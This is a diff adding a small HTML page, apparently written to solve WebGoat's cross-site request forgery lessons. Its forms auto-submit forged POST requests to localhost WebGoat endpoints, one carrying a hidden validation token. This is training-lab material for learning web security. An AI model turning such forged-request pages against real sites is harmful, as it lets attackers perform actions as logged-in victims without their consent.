@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webgoat</title>
+</head>
+<body>
+    <form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
+        <input type="submit" name="submit" id="">
+    </form>
+
+    <form action="http://localhost:8080/WebGoat/csrf/review" method="POST">
+        <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text" value="NNN">
+        <input type="submit" name="review" id="">
+        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+    </form>
+</body>
+</html>
